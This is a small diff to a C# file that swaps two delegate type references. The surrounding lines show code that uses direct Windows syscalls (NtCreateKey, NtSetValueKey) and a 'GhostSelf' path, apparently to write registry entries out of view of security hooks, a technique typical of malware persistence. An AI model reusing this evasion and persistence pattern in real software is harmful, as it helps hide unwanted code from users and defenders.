@@ -25,8 +25,8 @@ namespace VanguardCore.Defense
             try
             {
                 SyscallManager.Initialize();
-                var ntCreateKey = SyscallManager.GetSyscallDelegate<SyscallManager.NtCreateKey>("NtCreateKey");
-                var ntSetValueKey = SyscallManager.GetSyscallDelegate<SyscallManager.NtSetValueKey>("NtSetValueKey");
+                var ntCreateKey = SyscallManager.GetSyscallDelegate<NtCreateKey>("NtCreateKey");
+                var ntSetValueKey = SyscallManager.GetSyscallDelegate<NtSetValueKey>("NtSetValueKey");
                 if (ntCreateKey == null || ntSetValueKey == null) return;
 
                 string ghostPath = GhostSelf();
